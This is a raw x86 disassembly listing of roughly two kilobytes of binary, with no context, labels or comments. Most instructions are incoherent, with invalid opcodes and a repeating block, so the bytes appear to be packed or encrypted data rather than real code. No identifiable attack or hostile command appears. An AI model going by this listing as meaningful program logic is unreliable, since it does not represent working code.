  4186b4:	adc    DWORD PTR [esi+0x26],ecx
  4186b7:	xor    eax,0xd8629468
  4186bc:	out    0xd1,al
  4186be:	inc    eax
  4186bf:	jno    0x4186d9
  4186c1:	inc    edi
  4186c2:	inc    ebp
  4186c3:	add    eax,0x3d604662
  4186c8:	arpl   WORD PTR [ebx-0x6f],sp
  4186cb:	retf   
  4186cc:	push   ebx
  4186cd:	icebp  
  4186ce:	and    al,0x48
  4186d0:	cld    
  4186d1:	pop    esp
  4186d2:	sub    edi,DWORD PTR ds:0xe414aca
  4186d8:	cmp    eax,0xf9d28c8f
  4186dd:	push   edx
  4186de:	jl     0x41869d
  4186e0:	bound  eax,QWORD PTR [ebx+0x40]
  4186e3:	adc    BYTE PTR ds:0x4158cc40,al
  4186e9:	inc    ebx
  4186ea:	bound  eax,QWORD PTR [ecx+0x40]
  4186ed:	add    eax,0x4140
  4186f2:	and    eax,0x40400062
  4186f7:	add    eax,0x84404340
  4186fc:	int3   
  4186fd:	js     0x4186ff
  4186ff:	inc    ecx
  418700:	adc    BYTE PTR [edx+0xf],ah
  418703:	ret    
  418704:	sub    DWORD PTR [edi],ebp
  418706:	inc    eax
  418707:	pop    edx
  418708:	scas   eax,DWORD PTR es:[edi]
  418709:	inc    eax
  41870a:	arpl   WORD PTR [eax+0x40],ax
  41870d:	bound  ecx,QWORD PTR [edi+ebx*1+0x41aa35a7]
  418714:	pop    eax
  418715:	stc    
  418716:	imul   edi,DWORD PTR [eax],0x540640
  41871c:	inc    eax
  41871d:	inc    ecx
  41871e:	inc    eax
  41871f:	inc    ebx
  418720:	bound  ax,DWORD PTR ds:0x40434100
  418727:	add    eax,0x40054062
  41872c:	bound  eax,QWORD PTR [ecx+0x40]
  41872f:	inc    ebx
  418730:	inc    eax
  418731:	add    eax,0x25405841
  418736:	bound  eax,QWORD PTR [eax+0x43]
  418739:	inc    eax
  41873a:	adc    BYTE PTR [ebx+eiz*2],dl
  41873d:	mov    eax,0x7c605d4c
  418742:	ins    DWORD PTR es:[edi],dx
  418743:	xor    BYTE PTR [esi],bh
  418745:	push   es
  418746:	inc    edx
  418747:	mov    al,0xec
  418749:	inc    eax
  41874a:	jle    0x418751
  41874c:	push   0xd5612d3a
  418751:	and    DWORD PTR [eax-0x79],edi
  418754:	inc    eax
  418755:	retf   
  418756:	pop    ebp
  418757:	mul    DWORD PTR [ebp+0x7c]
  41875a:	bound  ecx,QWORD PTR [eax-0x67f5c0b8]
  418760:	jg     0x4187a2
  418762:	test   eax,0x40434140
  418767:	add    eax,0x43406262
  41876c:	inc    ecx
  41876d:	adc    BYTE PTR [eax],al
  41876f:	inc    eax
  418770:	add    eax,0x43000562
  418775:	add    BYTE PTR [ecx+0x40],al
  418778:	inc    eax
  418779:	add    eax,0x400062
  41877e:	inc    ebx
  41877f:	inc    eax
  418780:	js     0x4187c3
  418782:	inc    ecx
  418783:	bound  eax,QWORD PTR [eax+0x15]
  418786:	pop    esp
  418787:	stos   DWORD PTR es:[edi],eax
  418788:	test   al,0x20
  41878a:	inc    eax
  41878b:	sub    eax,0x45dac947
  418790:	bound  edx,QWORD PTR [esi+0x75]
  418793:	or     al,0xaa
  418795:	mov    eax,0x4973df67
  41879a:	push   ecx
  41879b:	inc    eax
  41879c:	dec    edx
  41879d:	adc    eax,0xb5624764
  4187a2:	xchg   edx,eax
  4187a3:	cmp    DWORD PTR [ebx+eax*2+0x67],esp
  4187a7:	xor    eax,0x4062c342
  4187ac:	add    eax,0x40430041
  4187b1:	inc    eax
  4187b2:	inc    ecx
  4187b3:	inc    eax
  4187b4:	inc    eax
  4187b5:	bound  eax,QWORD PTR ds:0x5624300
  4187bb:	add    BYTE PTR [eax+0x40],al
  4187be:	add    BYTE PTR [ecx+0x43],al
  4187c1:	add    BYTE PTR [eax+0x41],al
  4187c4:	add    eax,0x40436200
  4187c9:	inc    eax
  4187ca:	add    eax,0x42406962
  4187cf:	mov    ch,bl
  4187d1:	jo     0x4187fd
  4187d3:	outs   dx,BYTE PTR ds:[esi]
  4187d4:	pop    esi
  4187d5:	xor    bl,ah
  4187d7:	adc    eax,0xf44176d0
  4187dc:	dec    ebx
  4187dd:	call   0x62c25312
  4187e2:	sub    al,BYTE PTR [ecx]
  4187e4:	rol    DWORD PTR [eax+0x4f],1
  4187e7:	mov    al,0x60
  4187e9:	push   ds
  4187ea:	imul   eax,DWORD PTR [edi],0xddd2157
  4187f0:	and    ah,bh
  4187f2:	xor    al,0x2b
  4187f4:	jno    0x41883a
  4187f6:	dec    ebx
  4187f7:	leave  
  4187f8:	inc    ecx
  4187f9:	inc    eax
  4187fa:	add    eax,0x41624340
  4187ff:	test   BYTE PTR [eax],al
  418801:	and    eax,0x404043
  418806:	add    BYTE PTR ds:0x626210,al
  41880c:	add    eax,0x43404140
  418811:	inc    eax
  418812:	inc    ecx
  418813:	add    eax,0x10664062
  418818:	inc    ebx
  418819:	bound  esi,QWORD PTR [eax+0x52]
  41881c:	inc    ebx
  41881d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41881e:	inc    eax
  41881f:	inc    eax
  418820:	xor    ch,BYTE PTR [esp+ecx*4-0x2f29adbf]
  418827:	xor    eax,DWORD PTR [edx+0xd]
  41882a:	fdivr  DWORD PTR [eax+eax*4+0x3e583348]
  418831:	inc    ebx
  418832:	sbb    eax,DWORD PTR [eax+0x65]
  418835:	push   esi
  418836:	pop    eax
  418837:	inc    eax
  418838:	push   ebp
  418839:	mov    al,0xc8
  41883b:	add    eax,0x4041cc
  418840:	add    BYTE PTR [eax],al
  418842:	inc    eax
  418843:	inc    eax
  418844:	inc    ebx
  418845:	bound  eax,QWORD PTR [eax]
  418847:	inc    eax
  418848:	inc    eax
  418849:	add    eax,0x62434162
  41884e:	inc    eax
  41884f:	js     0x418861
  418851:	inc    ecx
  418852:	add    eax,0x5404325
  418857:	bound  eax,QWORD PTR [eax+0x40]
  41885a:	inc    ecx
  41885b:	inc    ebx
  41885c:	push   eax
  41885d:	out    dx,al
  41885e:	pop    esp
  41885f:	fldenv [ebx]
  418861:	jnp    0x418870
  418863:	push   ebx
  418864:	add    BYTE PTR [edi-0x43978ab2],ah
  41886a:	retf   
  41886b:	push   ecx
  41886c:	ss (bad) 
  41886e:	xchg   esp,eax
  41886f:	xor    BYTE PTR [eax-0x5e],al
  418872:	pop    ecx
  418873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418874:	arpl   WORD PTR [eax],cx
  418876:	mov    ds:0x356b2e1f,al
  41887b:	test   esp,ebx
  41887d:	push   esp
  41887e:	add    al,BYTE PTR [esi+0x6a]
  418881:	bound  edi,QWORD PTR [eax+0x4bc94162]
  418887:	mov    ah,0x78
  418889:	dec    eax
  41888a:	add    eax,0x13269d50
  41888f:	lods   eax,DWORD PTR ds:[esi]
  418890:	inc    edx
  418891:	and    eax,0x436241
  418896:	adc    BYTE PTR [eax+0x0],al
  418899:	add    eax,0x62410040
  41889e:	inc    eax
  41889f:	add    BYTE PTR [ebx-0x34],al
  4188a2:	inc    eax
  4188a3:	add    eax,0x78434040
  4188a8:	bound  eax,QWORD PTR [ecx+0x78]
  4188ab:	add    eax,0x62404043
  4188b0:	inc    esp
  4188b1:	jnp    0x4188b7
  4188b3:	xor    eax,0x286fc5bc
  4188b8:	sub    DWORD PTR [eax-0x75bd2d03],eax
  4188be:	inc    ecx
  4188bf:	shr    BYTE PTR [eax*1-0x5cb3d29e],1
  4188c6:	cmc    
  4188c7:	inc    edx
  4188c8:	dec    esp
  4188c9:	retf   
  4188ca:	leave  
  4188cb:	bound  esi,QWORD PTR [eax]
  4188cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ce:	leave  
  4188cf:	and    eax,0xc2661fd
  4188d4:	mov    ch,al
  4188d6:	fadd   DWORD PTR [eax+0x44]
  4188d9:	dec    ebx
  4188da:	inc    ecx
  4188db:	inc    eax
  4188dc:	add    eax,0x43436240
  4188e1:	add    eax,0x62004040
  4188e6:	inc    eax
  4188e7:	add    BYTE PTR [ecx+0x40],al
  4188ea:	inc    ebx
  4188eb:	test   BYTE PTR ds:0x58054041,ah
  4188f1:	inc    eax
  4188f2:	inc    eax
  4188f3:	bound  eax,QWORD PTR [eax+0x66]
  4188f6:	inc    ecx
  4188f7:	inc    eax
  4188f8:	add    eax,0x6b626100
  4188fd:	(bad)  [ecx]
  4188ff:	sub    esp,DWORD PTR [eax+eax*2]
  418902:	push   0xffffffa9
  418904:	lods   al,BYTE PTR ds:[esi]
  418905:	inc    eax
  418906:	gs inc eax
  418908:	sbb    BYTE PTR [ebp+0x62],cl
  41890b:	or     BYTE PTR ds:0x4c21d140,0x98
  418912:	adc    eax,0xcb40
  418917:	inc    ebx
  418918:	inc    eax
  418919:	bound  eax,QWORD PTR ds:0x25404110
  41891f:	add    ah,cl
  418921:	inc    ebx
  418922:	add    eax,0x40402562
  418927:	add    BYTE PTR [eax+0x40],al
  41892a:	inc    ecx
  41892b:	inc    ecx
  41892c:	add    eax,0x78434025
  418931:	bound  eax,QWORD PTR [eax-0x7c]
  418934:	inc    eax
  418935:	inc    ecx
  418936:	inc    eax
  418937:	push   esp
  418938:	loopne 0x4188d7
  41893a:	push   0x404140cb
  41893f:	adc    DWORD PTR [eax+0x40],esi
  418942:	inc    esp
  418943:	mov    DWORD PTR [ebp-0x80],ecx
  418946:	cmp    eax,0x28184040
  41894b:	jae    0x418945
  41894d:	ret    
  41894e:	in     al,dx
  41894f:	jo     0x4189b1
  418951:	addr16 push edi
  418953:	nop
  418954:	dec    edx
  418955:	mov    al,0x23
  418957:	sub    eax,DWORD PTR [eax+0x79]
  41895a:	popa   
  41895b:	mov    edi,0x2ee10544
  418960:	xor    al,0xab
  418962:	inc    ecx
  418963:	inc    eax
  418964:	inc    eax
  418965:	inc    ebx
  418966:	int3   
  418967:	add    BYTE PTR ds:0x56240,al
  41896d:	inc    ebx
  41896e:	inc    eax
  41896f:	inc    eax
  418970:	add    BYTE PTR [ecx+0x62],al
  418973:	bound  eax,QWORD PTR [eax]
  418975:	int3   
  418976:	inc    eax
  418977:	inc    ebx
  418978:	add    eax,0x43624041
  41897d:	adc    BYTE PTR [ecx+0x5],al
  418980:	inc    eax
  418981:	aad    0x70
  418983:	sub    bl,cl
  418985:	enter  0x401b,0x42
  418989:	arpl   WORD PTR [eax+ecx*8-0x42],ax
  41898d:	(bad)  
  41898f:	das    
  418990:	inc    esp
  418991:	inc    ebp
  418992:	rcr    DWORD PTR [edi],1
  418994:	add    bh,BYTE PTR [edi+0x6e]
  418997:	inc    eax
  418998:	daa    
  418999:	mov    BYTE PTR [eax],bl
  41899b:	cwde   
  41899c:	dec    edx
  41899d:	adc    al,BYTE PTR [ecx+0x2e]
  4189a0:	sub    bl,cl
  4189a2:	bound  ebx,QWORD PTR [edx+eiz*2]
  4189a5:	inc    ebx
  4189a6:	inc    eax
  4189a7:	adc    BYTE PTR ds:0x4158cc40,al
  4189ad:	inc    ebx
  4189ae:	bound  eax,QWORD PTR [ecx+0x40]
  4189b1:	add    eax,0x4140
  4189b6:	and    eax,0x40400062
  4189bb:	add    eax,0x84404340
  4189c0:	int3   
  4189c1:	js     0x4189c3
  4189c3:	inc    ecx
  4189c4:	adc    BYTE PTR [edx+0xf],ah
  4189c7:	clc    
  4189c8:	aad    0xd1
  4189ca:	ror    BYTE PTR [ebp+0x11],0x1f
  4189ce:	sub    BYTE PTR [eax],0xad
  4189d1:	leave  
  4189d2:	cmc    
  4189d3:	sub    DWORD PTR [eax+0x39151f4c],edi
  4189d9:	fwait
  4189da:	jnp    0x418a28
  4189dc:	or     eax,0xacb94a8
  4189e1:	ins    DWORD PTR es:[edi],dx
  4189e2:	dec    edx
  4189e3:	inc    esp
  4189e4:	inc    ecx
  4189e5:	adc    ch,BYTE PTR [edx-0x77]
  4189e8:	or     BYTE PTR [ecx-0x4731d60b],dl
  4189ee:	shl    BYTE PTR [ebx-0x4c],1
  4189f1:	cmp    ebx,DWORD PTR [edi+0x14]
  4189f4:	sub    BYTE PTR [edx+0x65],al
  4189f7:	inc    ecx
  4189f8:	jo     0x418a0d
  4189fa:	xlat   BYTE PTR ds:[ebx]
  4189fb:	add    BYTE PTR [eax+0x41],al
  4189fe:	inc    eax
  4189ff:	inc    ebx
  418a00:	bound  ax,DWORD PTR ds:0x40434100
  418a07:	add    eax,0x40054062
  418a0c:	bound  eax,QWORD PTR [ecx+0x40]
  418a0f:	inc    ebx
  418a10:	inc    eax
  418a11:	add    eax,0x25405841
  418a16:	bound  eax,QWORD PTR [eax+0x43]
  418a19:	inc    eax
  418a1a:	adc    BYTE PTR [ebp+0x2e],cl
  418a1d:	mov    edx,0x45534aa3
  418a22:	inc    ebx
  418a23:	leave  
  418a24:	cmp    al,bh
  418a26:	cmp    al,0xe8
  418a28:	cmp    edx,DWORD PTR [ecx]
  418a2a:	sbb    al,0x57
  418a2c:	bound  edx,QWORD PTR [edx+0x1e]
  418a2f:	or     BYTE PTR [eax+eax*2+0x10303273],dl
  418a36:	test   al,0xa8
  418a38:	inc    esi
  418a39:	jo     0x418a86
  418a3b:	inc    eax
  418a3c:	arpl   WORD PTR [edx+eiz*2],cx
  418a3f:	cld    
  418a40:	cmp    edi,edi
  418a42:	jno    0x418a62
  418a44:	dec    edx
  418a45:	int    0xac
  418a47:	and    BYTE PTR ds:[esi],ah
  418a4a:	inc    eax
  418a4b:	inc    ecx
  418a4c:	inc    ebx
  418a4d:	inc    eax
  418a4e:	add    eax,0x43406262
  418a53:	inc    ecx
  418a54:	adc    BYTE PTR [eax],al
  418a56:	inc    eax
  418a57:	add    eax,0x43000562
  418a5c:	add    BYTE PTR [ecx+0x40],al
  418a5f:	inc    eax
  418a60:	add    eax,0x400062
  418a65:	inc    ebx
  418a66:	inc    eax
  418a67:	js     0x418aaa
  418a69:	inc    ecx
  418a6a:	bound  eax,QWORD PTR [eax+0x70]
  418a6d:	addr16 int3 
  418a6f:	dec    eax
  418a70:	ret    
  418a71:	sub    al,BYTE PTR [edi]
  418a73:	inc    edx
  418a74:	neg    DWORD PTR [ebx]
  418a76:	jp     0x418a7d
  418a78:	fs xor eax,0xab7f10d5
  418a7e:	test   al,0xcb
  418a80:	mov    esi,0x3f323842
  418a85:	push   ecx
  418a86:	adc    al,BYTE PTR [ebx+0x63]
  418a89:	dec    eax
  418a8a:	aaa    
  418a8b:	push   edx
  418a8c:	jg     0x418ad2
  418a8e:	hlt    
  418a8f:	add    al,0x1d
  418a91:	cmp    eax,0x623fb11d
  418a96:	inc    eax
  418a97:	add    eax,0x40430041
  418a9c:	inc    eax
  418a9d:	inc    ecx
  418a9e:	inc    eax
  418a9f:	inc    eax
  418aa0:	bound  eax,QWORD PTR ds:0x5624300
  418aa6:	add    BYTE PTR [eax+0x40],al
  418aa9:	add    BYTE PTR [ecx+0x43],al
  418aac:	add    BYTE PTR [eax+0x41],al
  418aaf:	add    eax,0x40436200
  418ab4:	inc    eax
  418ab5:	add    eax,0x4c412b62
  418aba:	aam    0xc3
  418abc:	inc    BYTE PTR [ebp+0x7f]
  418abf:	and    al,0x64
  418ac1:	bound  ecx,QWORD PTR [ebx+0x40]
  418ac4:	xchg   esp,eax
  418ac5:	aaa    
  418ac6:	aas    
  418ac7:	push   ebp
  418ac8:	mov    BYTE PTR [ecx+0x4dc844e0],ah
  418ace:	jg     0x418a9b
  418ad0:	arpl   WORD PTR [edi-0xb98297],sp
  418ad6:	aas    
  418ad7:	dec    esp
  418ad8:	clc    
  418ad9:	cmp    DWORD PTR [eax-0x10],edx
  418adc:	iret   
  418add:	pop    eax
  418ade:	inc    edi
  418adf:	or     eax,0x62d0020d
  418ae4:	rol    DWORD PTR [ecx+0x40],cl
  418ae7:	add    eax,0x41624340
  418aec:	test   BYTE PTR [eax],al
  418aee:	and    eax,0x404043
  418af3:	add    BYTE PTR ds:0x626210,al
  418af9:	add    eax,0x43404140
  418afe:	inc    eax
  418aff:	inc    ecx
  418b00:	add    eax,0x10664062
  418b05:	inc    ebx
  418b06:	bound  edx,QWORD PTR [ecx-0x21]
  418b09:	inc    edx
  418b0a:	retf   
  418b0b:	scas   eax,DWORD PTR es:[edi]
  418b0c:	cmc    
  418b0d:	gs inc eax
  418b0f:	sbb    BYTE PTR [edi+0x52fd4044],bh
  418b15:	add    BYTE PTR [eax+0x11],ah
  418b18:	dec    eax
  418b19:	call   0x420d9048
  418b1e:	inc    eax
  418b1f:	add    BYTE PTR [eax],al
  418b21:	add    BYTE PTR [eax+0x40],al
  418b24:	inc    ebx
  418b25:	bound  eax,QWORD PTR [eax]
  418b27:	inc    eax
  418b28:	inc    eax
  418b29:	add    eax,0x62434162
  418b2e:	inc    eax
  418b2f:	js     0x418b41
  418b31:	inc    ecx
  418b32:	add    eax,0x5404325
  418b37:	bound  eax,QWORD PTR [eax+0x40]
  418b3a:	inc    ecx
  418b3b:	inc    ebx
  418b3c:	cli    
  418b3d:	mov    ebp,0x5f1f4063
  418b42:	adc    BYTE PTR [edx-0x74],al
  418b45:	push   ss
  418b46:	mov    ch,0x40
  418b48:	dec    edx
  418b49:	jg     0x418b90
  418b4b:	imul   ch
  418b4d:	test   eax,0x3fd54048
  418b52:	dec    ecx
  418b53:	inc    esp
  418b54:	loop   0x418bb2
  418b56:	xor    eax,0xbe404a50
  418b5b:	arpl   WORD PTR [eax-0x20bf9851],bp
  418b61:	and    eax,0x436241
  418b66:	adc    BYTE PTR [eax+0x0],al
  418b69:	add    eax,0x62410040
  418b6e:	inc    eax
  418b6f:	add    BYTE PTR [ebx-0x34],al
  418b72:	inc    eax
  418b73:	add    eax,0x78434040
  418b78:	bound  eax,QWORD PTR [ecx+0x78]
  418b7b:	add    eax,0x62404043
  418b80:	rcl    DWORD PTR [edx-0x80],cl
  418b83:	adc    bl,cl
  418b85:	inc    eax
  418b86:	inc    eax
  418b87:	push   0x4115585b
  418b8c:	push   ecx
  418b8d:	arpl   WORD PTR [eax-0xb],ax
  418b90:	push   ecx
  418b91:	xor    cl,ch
  418b93:	and    bl,BYTE PTR ds:0x2f6950b8
  418b99:	inc    edx
  418b9a:	adc    esp,ebp
  418b9c:	xor    bl,BYTE PTR [ecx]
  418b9e:	inc    eax
  418b9f:	push   ecx
  418ba0:	std    
  418ba1:	fsubp  st(0),st
  418ba3:	sbb    ch,BYTE PTR [ebx+0x404061]
  418ba9:	inc    edi
  418baa:	or     eax,0x404a4634
  418baf:	push   eax
  418bb0:	pop    ds
  418bb1:	adc    bl,cl
  418bb3:	mov    edi,0x40054041
  418bb8:	bound  eax,QWORD PTR [ebx+0x43]
  418bbb:	add    eax,0x62004040
  418bc0:	inc    eax
  418bc1:	add    BYTE PTR [ecx+0x40],al
  418bc4:	inc    ebx
  418bc5:	test   BYTE PTR ds:0x58054041,ah
  418bcb:	inc    eax
  418bcc:	inc    eax
  418bcd:	bound  eax,QWORD PTR [eax+0x66]
  418bd0:	inc    ecx
  418bd1:	inc    eax
  418bd2:	add    eax,0x10639900
  418bd7:	add    BYTE PTR es:[edx-0x80],dl
  418bdb:	ins    DWORD PTR es:[edi],dx
  418bdc:	jo     0x418b81
  418bde:	inc    eax
  418bdf:	push   eax
  418be0:	pop    ds
  418be1:	ds add eax,0x40c0413b
  418be7:	mov    bl,0x0
  418be9:	add    BYTE PTR [ebx+0x40],al
  418bec:	bound  eax,QWORD PTR ds:0x25404110
  418bf2:	add    ah,cl
  418bf4:	inc    ebx
  418bf5:	add    eax,0x40402562
  418bfa:	add    BYTE PTR [eax+0x40],al
  418bfd:	inc    ecx
  418bfe:	inc    ecx
  418bff:	add    eax,0x78434025
  418c04:	bound  eax,QWORD PTR [eax-0x7c]
  418c07:	inc    eax
  418c08:	inc    ecx
  418c09:	inc    ecx
  418c0a:	stos   DWORD PTR es:[edi],eax
  418c0b:	inc    esi
  418c0c:	(bad)  
  418c0d:	leave  
  418c0e:	lods   al,BYTE PTR ds:[esi]
  418c0f:	inc    eax
  418c10:	and    edi,edi
  418c12:	dec    eax
  418c13:	popa   
  418c14:	inc    esp
  418c15:	es adc eax,0x44bf3910
  418c1b:	shl    BYTE PTR [eax-0x44bf3250],1
  418c21:	add    BYTE PTR [edi],dh
  418c23:	bound  ebp,QWORD PTR [edx]
  418c25:	inc    ecx
  418c26:	fadd   QWORD PTR [ecx+0x40]
  418c29:	inc    eax
  418c2a:	inc    ebx
  418c2b:	int3   
  418c2c:	add    BYTE PTR ds:0x56240,al
  418c32:	inc    ebx
  418c33:	inc    eax
  418c34:	inc    eax
  418c35:	add    BYTE PTR [ecx+0x62],al
  418c38:	bound  eax,QWORD PTR [eax]
  418c3a:	int3   
  418c3b:	inc    eax
  418c3c:	inc    ebx
  418c3d:	add    eax,0x43624041
  418c42:	adc    BYTE PTR [ecx+0x5],al
  418c45:	inc    eax
  418c46:	inc    eax
  418c47:	push   0x1f
  418c49:	and    BYTE PTR [ebx],dh
  418c4b:	test   al,0x92
  418c4d:	mov    ds:0x4d777341,eax
  418c52:	xor    al,0x12
  418c54:	pop    esp
  418c55:	shl    BYTE PTR gs:[edi+ebx*1],1
  418c59:	and    ebx,edi
  418c5b:	inc    edx
  418c5c:	(bad)  
  418c5d:	fild   WORD PTR [eax+0x31]
  418c60:	add    BYTE PTR [edx],ah
  418c62:	add    DWORD PTR ds:[esi+0x1f794098],ecx
  418c69:	bound  eax,QWORD PTR [ebx+0x40]
  418c6c:	adc    BYTE PTR ds:0x4158cc40,al
  418c72:	inc    ebx
  418c73:	bound  eax,QWORD PTR [ecx+0x40]
  418c76:	add    eax,0x4140
  418c7b:	and    eax,0x40400062
  418c80:	add    eax,0x84404340
  418c85:	int3   
  418c86:	js     0x418c88
  418c88:	inc    ecx
  418c89:	adc    BYTE PTR [edx+0xf],ah
  418c8c:	bound  eax,QWORD PTR [eax+0x14]
  418c8f:	icebp  
  418c90:	test   BYTE PTR [eax-0x4f],0x6a
  418c94:	dec    ebp
  418c95:	popa   
  418c96:	int    0x40
  418c98:	loopne 0x418cda
  418c9a:	dec    ecx
  418c9b:	stc    
  418c9c:	xor    ebp,DWORD PTR [ecx]
  418c9e:	dec    eax
  418c9f:	fimul  WORD PTR ds:0x40665140
  418ca5:	add    eax,0xd1cb680d
  418caa:	dec    esp
  418cab:	test   DWORD PTR [ecx],0xb005cb87
  418cb1:	inc    eax
  418cb2:	lock imul edx,DWORD PTR [ebx-0x9364bb9],0xc9b2440
  418cbd:	xor    ecx,DWORD PTR [eax+0x0]
  418cc0:	inc    eax
  418cc1:	inc    ecx
  418cc2:	inc    eax
  418cc3:	inc    ebx
  418cc4:	bound  ax,DWORD PTR ds:0x40434100
  418ccb:	add    eax,0x40054062
  418cd0:	bound  eax,QWORD PTR [ecx+0x40]
  418cd3:	inc    ebx
  418cd4:	inc    eax
  418cd5:	add    eax,0x25405841
  418cda:	bound  eax,QWORD PTR [eax+0x43]
  418cdd:	inc    eax
  418cde:	adc    BYTE PTR [ebx+eiz*1+0x55494f40],bl
  418ce5:	nop
  418ce6:	jnp    0x418cfd
  418ce8:	mov    al,0x3f
  418cea:	rcl    edi,cl
  418cec:	jnp    0x418d03
  418cee:	nop
  418cef:	leave  
  418cf0:	add    eax,0x45569240
  418cf5:	jnp    0x418d59
  418cf7:	inc    eax
  418cf8:	leave  
  418cf9:	inc    eax
  418cfa:	rcr    DWORD PTR [ebp-0x59],cl
  418cfd:	lods   al,BYTE PTR ds:[esi]
  418cfe:	adc    eax,0xbb404490
  418d03:	mov    edi,0xc3f715ac
  418d08:	inc    ecx
  418d09:	cmp    al,0x17
  418d0b:	add    eax,0xa04f4662
  418d10:	push   ebp
  418d11:	inc    eax
  418d12:	aas    
  418d13:	adc    DWORD PTR [edx],esi
  418d15:	nop
  418d16:	cmp    eax,DWORD PTR [eax+0x41]
  418d19:	inc    ebx
  418d1a:	inc    eax
  418d1b:	add    eax,0x43406262
  418d20:	inc    ecx
  418d21:	adc    BYTE PTR [eax],al
  418d23:	inc    eax
  418d24:	add    eax,0x43000562
  418d29:	add    BYTE PTR [ecx+0x40],al
  418d2c:	inc    eax
  418d2d:	add    eax,0x400062
  418d32:	inc    ebx
  418d33:	inc    eax
  418d34:	js     0x418d77
  418d36:	inc    ecx
  418d37:	bound  eax,QWORD PTR [eax+0x5]
  418d3a:	fadd   QWORD PTR [eax+0x1f]
  418d3d:	jmp    0x4775b585
  418d42:	fild   DWORD PTR [eax-0xf]
  418d45:	mov    cl,0xa5
  418d47:	enter  0x44bf,0xa8
  418d4b:	bound  eax,QWORD PTR cs:[eax+0x5]
  418d4f:	inc    ecx
  418d50:	add    BYTE PTR [ebx+0x40],al
  418d53:	inc    eax
  418d54:	inc    ecx
  418d55:	inc    eax
  418d56:	inc    eax
  418d57:	bound  eax,QWORD PTR ds:0x5624300
  418d5d:	add    BYTE PTR [eax+0x40],al
  418d60:	add    BYTE PTR [ecx+0x43],al
  418d63:	add    BYTE PTR [eax+0x41],al
  418d66:	add    eax,0x40436200
  418d6b:	inc    eax
  418d6c:	add    eax,0x45cd9662
  418d71:	lds    esi,FWORD PTR [esp+ebx*8+0x159340eb]
  418d78:	xor    BYTE PTR [edi+0x3d],cl
  418d7b:	and    BYTE PTR [esi],0x40
  418d7e:	imul   ecx,DWORD PTR [ecx-0x1f],0xffffffac
  418d82:	ret    
  418d83:	rol    DWORD PTR [eax+0x40],0x51
  418d87:	cdq    
  418d88:	test   eax,0x409c460d
  418d8d:	inc    eax
  418d8e:	sbb    edx,DWORD PTR [edx+eax*2]
  418d91:	jnp    0x418d53
  418d93:	adc    eax,0x77f3d741
  418d98:	leave  
  418d99:	test   ah,al
  418d9b:	retf   
  418d9c:	pop    es
  418d9d:	mov    ds:0xd406030,al
  418da2:	inc    ecx
  418da3:	inc    eax
  418da4:	add    eax,0x41624340
  418da9:	test   BYTE PTR [eax],al
  418dab:	and    eax,0x404043
  418db0:	add    BYTE PTR ds:0x626210,al
  418db6:	add    eax,0x43404140
  418dbb:	inc    eax
  418dbc:	inc    ecx
  418dbd:	add    eax,0x10664062
  418dc2:	inc    ebx
  418dc3:	bound  esp,QWORD PTR [edx+0x42]
  418dc6:	inc    ecx
  418dc7:	out    0x34,eax
  418dc9:	test   DWORD PTR [ecx],0xff4a06cb
  418dcf:	xor    eax,0x46935b17
  418dd4:	jl     0x418d7e
  418dd6:	and    al,0x2d
  418dd8:	inc    esi
  418dd9:	cdq    
  418dda:	sbb    al,0x2e
  418ddc:	arpl   WORD PTR [esi+0x53b88e44],cx
  418de2:	loope  0x418dac
  418de4:	retf   
  418de5:	cdq    
  418de6:	inc    edi
  418de7:	cmp    DWORD PTR [ebp+0x4041cc05],0x40000000
  418df1:	inc    eax
  418df2:	inc    ebx
  418df3:	bound  eax,QWORD PTR [eax]
  418df5:	inc    eax
  418df6:	inc    eax
  418df7:	add    eax,0x62434162
  418dfc:	inc    eax
  418dfd:	js     0x418e0f
  418dff:	inc    ecx
  418e00:	add    eax,0x5404325
  418e05:	bound  eax,QWORD PTR [eax+0x40]
  418e08:	inc    ecx
  418e09:	inc    ebx
  418e0a:	aaa    
  418e0b:	dec    esp
  418e0c:	dec    edi
  418e0d:	push   es
  418e0e:	inc    ecx
  418e0f:	cmp    DWORD PTR [edi+0x3],esi
  418e12:	mov    edi,0xa7d2415
  418e17:	push   ebp
  418e18:	push   edx
  418e19:	pop    DWORD PTR [ebp-0x35]
  418e1c:	test   eax,0xd40f6766
  418e21:	xor    ebp,edx
  418e23:	dec    edi
  418e24:	or     eax,0x6463a0f7
  418e29:	and    eax,0x436241
  418e2e:	adc    BYTE PTR [eax+0x0],al
  418e31:	add    eax,0x62410040
  418e36:	inc    eax
  418e37:	add    BYTE PTR [ebx-0x34],al
  418e3a:	inc    eax
  418e3b:	add    eax,0x78434040
  418e40:	bound  eax,QWORD PTR [ecx+0x78]
  418e43:	add    eax,0x62404043
  418e48:	inc    ebp
  418e49:	jp     0x418e7e
  418e4b:	and    BYTE PTR [edi+0xd],cl
  418e4e:	(bad)  
  418e4f:	sub    dl,BYTE PTR [ecx+0x15]
  418e52:	inc    eax
  418e53:	pusha  
  418e54:	test   DWORD PTR [edx+0x6c],ecx
  418e57:	xchg   esi,eax
  418e58:	dec    ecx
  418e59:	push   ecx
  418e5a:	add    esi,ecx
  418e5c:	and    ch,BYTE PTR [edx]
  418e5e:	inc    ecx
  418e5f:	fst    DWORD PTR [edx+0x52a890bf]
  418e65:	inc    eax
  418e66:	and    eax,0x4041276f
  418e6b:	add    eax,0x43436240
  418e70:	add    eax,0x62004040
  418e75:	inc    eax
  418e76:	add    BYTE PTR [ecx+0x40],al
  418e79:	inc    ebx
  418e7a:	test   BYTE PTR ds:0x58054041,ah
  418e80:	inc    eax
  418e81:	inc    eax
  418e82:	bound  eax,QWORD PTR [eax+0x66]
  418e85:	inc    ecx
  418e86:	inc    eax
  418e87:	add    eax,0x12b40600
  418e8c:	test   eax,0x5bc35c91
  418e91:	jne    0x418ee0
  418e93:	test   al,0xb0
  418e95:	ret    
  418e96:	cli    
  418e97:	sub    esi,DWORD PTR [ecx+0x66]
  418e9a:	jnp    0x418ede
  418e9c:	mov    dl,0xa0
  418e9e:	jne    0x418edf
  418ea0:	bound  esi,QWORD PTR [ecx-0x44]
  418ea3:	add    BYTE PTR [eax],al
  418ea5:	inc    ebx
  418ea6:	inc    eax
  418ea7:	bound  eax,QWORD PTR ds:0x25404110
  418ead:	add    ah,cl
  418eaf:	inc    ebx
  418eb0:	add    eax,0x40402562
  418eb5:	add    BYTE PTR [eax+0x40],al
  418eb8:	inc    ecx
  418eb9:	inc    ecx
  418eba:	add    eax,0x78434025
  418ebf:	bound  eax,QWORD PTR [eax-0x7c]
